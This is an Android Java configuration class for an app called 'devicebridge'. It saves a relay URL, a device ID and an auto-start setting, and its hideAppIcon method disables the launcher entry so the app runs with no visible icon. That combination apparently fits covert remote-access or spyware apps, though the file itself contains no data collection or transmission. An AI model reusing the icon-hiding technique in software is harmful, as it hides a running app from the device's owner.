package com.devicebridge.utils;

import android.content.Context;
import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.content.SharedPreferences;

public class Config {

    private static final String PREFS = "devicebridge_config";
    private static final String KEY_RELAY_URL = "relay_url";
    private static final String KEY_DEVICE_ID = "device_id";
    private static final String KEY_AUTO_START = "auto_start";

    public static void saveConfig(Context ctx, String relayUrl, String deviceId) {
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                .edit()
                .putString(KEY_RELAY_URL, relayUrl)
                .putString(KEY_DEVICE_ID, deviceId)
                .apply();
    }

    public static String getRelayUrl(Context ctx) {
        return ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                .getString(KEY_RELAY_URL, "");
    }

    public static String getDeviceId(Context ctx) {
        return ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                .getString(KEY_DEVICE_ID, "");
    }

    public static String getOrCreateDeviceId(Context ctx) {
        String existing = getDeviceId(ctx);
        if (existing != null && !existing.isEmpty()) {
            return existing;
        }
        String modelStr = android.os.Build.MODEL.replaceAll("[^a-zA-Z0-9]", "").toLowerCase();
        String generated = modelStr + "_" + java.util.UUID.randomUUID().toString()
                .replace("-", "").substring(0, 8);
        saveConfig(ctx, getRelayUrl(ctx), generated);
        return generated;
    }

    public static void setAutoStart(Context ctx, boolean enabled) {
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                .edit()
                .putBoolean(KEY_AUTO_START, enabled)
                .apply();
    }

    public static void hideAppIcon(Context ctx) {
        try {
            PackageManager p = ctx.getPackageManager();
            ComponentName componentName = new ComponentName(ctx, com.devicebridge.MainActivity.class);
            p.setComponentEnabledSetting(componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
        } catch (Exception ignored) {}
    }

    public static boolean isAutoStart(Context ctx) {
        return ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                .getBoolean(KEY_AUTO_START, false);
    }
}
